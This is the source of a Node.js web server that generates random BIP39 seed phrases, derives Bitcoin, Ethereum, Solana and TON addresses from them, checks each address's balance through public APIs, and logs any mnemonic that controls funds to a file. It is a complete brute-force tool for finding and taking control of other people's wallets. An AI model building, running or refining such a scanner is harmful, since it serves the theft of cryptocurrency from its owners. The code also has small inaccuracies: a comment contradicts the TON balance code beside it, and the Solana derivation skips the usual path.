require('dotenv').config();

const bip39 = require('bip39');
const { BIP32Factory } = require('bip32');
const bitcoin = require('bitcoinjs-lib');
const TronWeb = require('tronweb');
const WebSocket = require('ws');
const fs = require('fs');
const ecc = require('tiny-secp256k1');
const { ECPairFactory } = require('ecpair');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { Connection, LAMPORTS_PER_SOL, Keypair } = require('@solana/web3.js');
const nacl = require('tweetnacl');
const { TonClient, WalletContractV4, Address } = require('@ton/ton');
const { mnemonicToWalletKey } = require('@ton/crypto');
const bs58 = require('bs58');

const bip32 = BIP32Factory(ecc);
const ECPair = ECPairFactory(ecc);

const networks = {
    bitcoin: {
        lib: bitcoin.networks.bitcoin,
        path: "m/44'/0'/0'/0/0",
        decimals: 8
    },
    ethereum: {
        path: "m/44'/60'/0'/0/0",
        tokens: {
            usdt: {
                address: '0xdac17f958d2ee523a2206206994597c13d831ec7',
                decimals: 6
            }
        },
        decimals: 18
    },
    solana: {
        path: "m/44'/501'/0'/0'",
        decimals: 9
    },
    ton: {
        path: "m/44'/607'/0'/0'",
        decimals: 9
    }
};

const apiProviders = {
    ethereum: [
        { name: 'etherscan', baseURL: 'https://api.etherscan.io/v2/api?chainid=1&module=account&action=balance&address={address}&tag=latest', apiKey: process.env.ETHERSCAN_API_KEY, responsePath: 'result' }
    ],
    bitcoin: [
        { name: 'mempool_space', baseURL: 'https://mempool.space/api/address/{address}', responsePath: 'chain_stats' }
    ],
    tron: [
        { name: 'trongrid', baseURL: 'https://api.trongrid.io/v1/accounts/{address}', responsePath: 'data[0].balance' }
    ],
    solana: [
        { name: 'solana', baseURL: 'https://api.mainnet-beta.solana.com', method: 'getBalance', responsePath: 'value' }
    ],
    ton: [
        { name: 'toncenter', baseURL: 'https://toncenter.com/api/v2/jsonRPC', apiKey: process.env.TONCENTER_API_KEY }
    ] // TON balance check not supported yet
};

const apiConfig = {
    bitcoin: {
        providers: ['mempool_space']
    },
    ethereum: {
        providers: ['etherscan']
    },
    tron: {
        providers: ['trongrid']
    },
    solana: {
        providers: ['solana']
    },
    ton: {
        providers: ['toncenter']
    }
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function deriveAddress(currency, { seed, root, mnemonic }) {
    const network = networks[currency];
    switch (currency) {
        case 'bitcoin': {
            const child = root.derivePath(network.path);
            const { address } = bitcoin.payments.p2pkh({ pubkey: child.publicKey, network: network.lib });
            return address;
        }
        case 'solana': {
            const solanaAccount = Keypair.fromSeed(seed.slice(0, 32));
            return solanaAccount.publicKey.toBase58();
        }
        case 'ton': {
            const tonKeys = await mnemonicToWalletKey(mnemonic.split(' '));
            const wallet = WalletContractV4.create({ publicKey: tonKeys.publicKey, workchain: 0 });
            return wallet.address.toString({ testOnly: false });
        }
        default:
            throw new Error(`Unsupported currency for derivation: ${currency}`);
    }
}

const exchangeRateCache = {};
const mobulaSymbols = {
    bitcoin: 'BTC',
    ethereum: 'ETH',
    solana: 'SOL',
    ton: 'TON',
    usdt: 'USDT'
};

async function updateAllExchangeRates() {
    const symbols = Object.values(mobulaSymbols).join(',');
    console.log('Updating exchange rates with CryptoCompare...');
    try {
        const response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=${symbols}&tsyms=USD`);
        const data = await response.json();

        if (response.ok && data.Response !== 'Error') {
            for (const symbol in data) {
                const currency = Object.keys(mobulaSymbols).find(key => mobulaSymbols[key] === symbol);
                if (currency && data[symbol] && data[symbol].USD) {
                    exchangeRateCache[currency] = data[symbol].USD;
                }
            }
            console.log('Exchange rates updated successfully from CryptoCompare.', exchangeRateCache);
        } else {
            console.error('CryptoCompare API error:', data.Message || 'Unknown error');
            console.log('Using hardcoded fallback exchange rates.');
            exchangeRateCache['bitcoin'] = 60000;
            exchangeRateCache['ethereum'] = 3000;
            exchangeRateCache['solana'] = 150;
            exchangeRateCache['ton'] = 6;
            exchangeRateCache['usdt'] = 1;
        }
    } catch (error) {
        console.error('Could not update exchange rates from CryptoCompare:', error);
        console.log('Using hardcoded fallback exchange rates due to fetch error.');
        exchangeRateCache['bitcoin'] = 60000;
        exchangeRateCache['ethereum'] = 3000;
        exchangeRateCache['solana'] = 150;
        exchangeRateCache['ton'] = 6;
        exchangeRateCache['usdt'] = 1;
    }
}

// Update rates every 2 minutes
// setInterval(updateAllExchangeRates, 2 * 60 * 1000);

function getExchangeRate(currency) {
    console.log(`[getExchangeRate] Getting rate for: ${currency}. Current cache:`, exchangeRateCache);
    return exchangeRateCache[currency] || 0;
}

async function getBalance(currency, address) {
    const providers = apiProviders[currency];
    const network = networks[currency];

    if (!providers || providers.length === 0) {
        if (currency !== 'ton') { // TON is expected to be empty for now
            console.error(`No providers configured for ${currency}`);
        }
        return 0;
    }

    for (const provider of providers) {
        try {
            let balance = 0n;

            if (provider.method === 'getBalance') { // Special case for Solana
                const connection = new Connection(provider.baseURL);
                const publicKey = new (require('@solana/web3.js').PublicKey)(address);
                balance = await connection.getBalance(publicKey);
            } else if (provider.name === 'toncenter') {
                const client = new TonClient({ endpoint: provider.baseURL, apiKey: provider.apiKey });
                const tonAddress = Address.parse(address);
                balance = await client.getBalance(tonAddress);
            } else { // Generic REST API handler
                let url = provider.baseURL.replace('{address}', address);
                if (provider.apiKey) {
                    url += `&apikey=${provider.apiKey}`;
                }

                const response = await fetch(url);
                if (!response.ok) {
                    throw new Error(`API request failed with status ${response.status}`);
                }
                const data = await response.json();

                if (provider.name === 'etherscan' && data.status !== '1') {
                    throw new Error(`Etherscan API error: ${data.message}`);
                }

                const getNestedValue = (obj, path) => {
                    return path.split('.').reduce((o, i) => {
                        const match = i.match(/(\w+)\[(\d+)\]/);
                        if (match) {
                            return o && o[match[1]] ? o[match[1]][parseInt(match[2])] : undefined;
                        }
                        return o && o[i];
                    }, obj);
                };

                if (provider.name === 'mempool_space') {
                    const stats = getNestedValue(data, provider.responsePath);
                    if (stats) {
                        balance = BigInt(stats.funded_txo_sum) - BigInt(stats.spent_txo_sum);
                    }
                } else {
                    const rawBalance = getNestedValue(data, provider.responsePath);
                    if (typeof rawBalance !== 'undefined' && rawBalance !== null) {
                        balance = BigInt(rawBalance);
                    }
                }
            }

            if (balance > 0n) {
                return { native: balance };
            }

            // Token balance checks
            if (network.tokens) {
                const tokenBalances = {};
                for (const token in network.tokens) {
                    const tokenAddress = network.tokens[token].address;
                    let tokenBalance = 0n;

                    if (currency === 'ethereum') {
                        const provider = new ethers.InfuraProvider('mainnet', process.env.INFURA_API_KEY);
                        const contract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)'], provider);
                        tokenBalance = await contract.balanceOf(address);
                    }

                    if (tokenBalance > 0n) {
                        tokenBalances[token] = tokenBalance;
                    }
                }
                if (Object.keys(tokenBalances).length > 0) {
                    return { native: balance, tokens: tokenBalances };
                }
            }

            return { native: balance };

        } catch (error) {
            console.error(`Error with ${provider.name} checking ${address}:`, error.message);
            await sleep(1000); // Add a delay to avoid rate limiting
        }
    }

    return { native: 0n };
}

const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const port = 3004;

app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

async function startServer() {
    await updateAllExchangeRates();
    app.listen(port, () => {
        console.log(`Server is running on port ${port}`);
    });
}

startServer();

let clients = [];
let isChecking = false;
let isPaused = false;

app.get('/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    clients.push(res);

    req.on('close', () => {
        clients = clients.filter(client => client !== res);
    });
});

function broadcast(data) {
    clients.forEach(client => client.write(`data: ${data}\n\n`));
}

app.post('/start', (req, res) => {
    if (isChecking) {
        isPaused = false;
        return res.status(200).send('Checker is already running. Resuming.');
    }

    isPaused = false;
    isChecking = true;

    const { length } = req.body;
    let strength;
    switch (parseInt(length)) {
        case 12:
            strength = 128;
            break;
        case 18:
            strength = 192;
            break;
        case 24:
            strength = 256;
            break;
        default:
            return res.status(400).send('Invalid seed phrase length.');
    }

    const runChecks = async () => {
        while (isChecking) {
            if (isPaused) {
                await sleep(1000);
                continue;
            }

            const mnemonic = bip39.generateMnemonic(strength);
            const seed = await bip39.mnemonicToSeed(mnemonic);
            const root = bip32.fromSeed(seed);

            const currenciesToCheck = ['bitcoin', 'ethereum', 'solana', 'ton'];

            for (const currency of currenciesToCheck) {
                if (!isChecking) break;
                const network = networks[currency];
                let address;

                if (currency === 'ethereum') {
                    const wallet = ethers.Wallet.fromPhrase(mnemonic);
                    address = wallet.address;
                } else {
                    address = await deriveAddress(currency, { seed, root, mnemonic });
                }

                if (address) {
                    const progressMessage = JSON.stringify({ type: 'progress', mnemonic, currency, address });
                    broadcast(progressMessage);
                    console.log(`Checking: ${currency} address ${address}`);

                    const balances = await getBalance(currency, address);

                    if (balances.native > 0n) {
                        const exchangeRate = getExchangeRate(currency);
                        const decimals = networks[currency].decimals;
                        const balanceInMainUnit = parseFloat(ethers.formatUnits(balances.native, decimals));
                        const balanceInUSD = balanceInMainUnit * exchangeRate;

                        const foundMessage = JSON.stringify({ type: 'found', mnemonic, currency, address, balance: String(balances.native), balanceInUSD: balanceInUSD.toFixed(2) });
                        broadcast(foundMessage);

                        const symbol = mobulaSymbols[currency];
                        const logMessage = `Found seed with balance! Mnemonic: ${mnemonic}, Currency: ${currency}, Address: ${address}, Balance: ${balanceInMainUnit.toFixed(8)} ${symbol}, Balance (USD): ${balanceInUSD.toFixed(2)}`;
                        console.log(logMessage);
                        fs.appendFileSync('found.log', `${new Date().toISOString()} - ${logMessage}\n`);
                    }

                    if (balances.tokens) {
                        for (const token in balances.tokens) {
                            const tokenBalance = balances.tokens[token];
                            const tokenInfo = networks[currency].tokens[token];
                            const tokenDecimals = tokenInfo.decimals || 18; // Default to 18 if not specified
                            const tokenExchangeRate = getExchangeRate(token) || 0;

                            const balanceInMainUnit = parseFloat(ethers.formatUnits(tokenBalance, tokenDecimals));
                            const balanceInUSD = balanceInMainUnit * tokenExchangeRate;

                            const foundMessage = JSON.stringify({ type: 'found', mnemonic, currency, address, token, balance: String(tokenBalance), balanceInUSD: balanceInUSD.toFixed(2) });
                            broadcast(foundMessage);

                            const logMessage = `Found seed with token balance! Mnemonic: ${mnemonic}, Currency: ${currency}, Address: ${address}, Token: ${token.toUpperCase()}, Balance: ${balanceInMainUnit.toFixed(8)}, Balance (USD): ${balanceInUSD.toFixed(2)}`;
                            console.log(logMessage);
                            fs.appendFileSync('found.log', `${new Date().toISOString()} - ${logMessage}\n`);
                        }
                    }
                }
            }
            if (isChecking) await sleep(2000);
        }
    };

    runChecks();
    res.status(200).send('Started checker.');
});


app.post('/pause', (req, res) => {
    isPaused = true;
    res.status(200).send();
});

app.post('/stop', (req, res) => {
    isChecking = false;
    isPaused = false;
    res.status(200).send();
});

app.post('/check-balance', async (req, res) => {
    const { address, currency } = req.body;
    console.log(`[/check-balance] Request for currency: ${currency}, address: ${address}`);

    const balances = await getBalance(currency, address);
    const exchangeRate = getExchangeRate(currency);
    const decimals = networks[currency].decimals;
    const balanceInMainUnit = parseFloat(ethers.formatUnits(balances.native, decimals));
    const balanceInUSD = balanceInMainUnit * exchangeRate;

    console.log(`[/check-balance] Native balance check: Balance=${balances.native}, Rate=${exchangeRate}, Decimals=${decimals}, BalanceInUSD=${balanceInUSD}`);

    const response = {
        native: { balance: balances.native.toString(), balanceInUSD: balanceInUSD.toFixed(2) },
        tokens: {}
    };

    if (balances.tokens) {
        console.log(`[/check-balance] Found tokens:`, balances.tokens);
        for (const token in balances.tokens) {
            const tokenBalance = balances.tokens[token];
            const tokenInfo = networks[currency].tokens[token];
            const tokenDecimals = tokenInfo.decimals || 18;
            const tokenExchangeRate = getExchangeRate(token) || 0;

            const balanceInMainUnit = parseFloat(ethers.formatUnits(tokenBalance, tokenDecimals));
            const balanceInUSD = balanceInMainUnit * tokenExchangeRate;

            console.log(`[/check-balance] Token ${token} check: Balance=${tokenBalance}, Rate=${tokenExchangeRate}, Decimals=${tokenDecimals}, BalanceInUSD=${balanceInUSD}`);

            response.tokens[token] = {
                balance: tokenBalance.toString(),
                balanceInUSD: balanceInUSD.toFixed(2)
            };
        }
    }

    res.json(response);
});